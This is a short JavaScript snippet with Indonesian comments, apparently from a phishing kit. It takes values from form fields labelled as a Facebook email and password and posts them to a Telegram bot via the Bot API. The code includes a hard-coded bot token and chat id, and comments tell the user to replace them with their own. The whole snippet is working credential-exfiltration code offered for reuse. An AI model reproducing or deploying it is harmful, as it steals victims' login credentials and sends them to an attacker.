function kirimPesan() {

    var nama = document.getElementById('nama');
    var email = document.getElementById('email')

    var gabungan = 'Email Facebook%3A%0A' + nama.value + '%0APassword%3A%0A' + email.value;

    var token = '5677127618:AAECszzR3EBxZo327yj86j61a2jQv3LidZg'; // Ganti dengan token bot yang kamu buat
    var grup = '-960912244'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}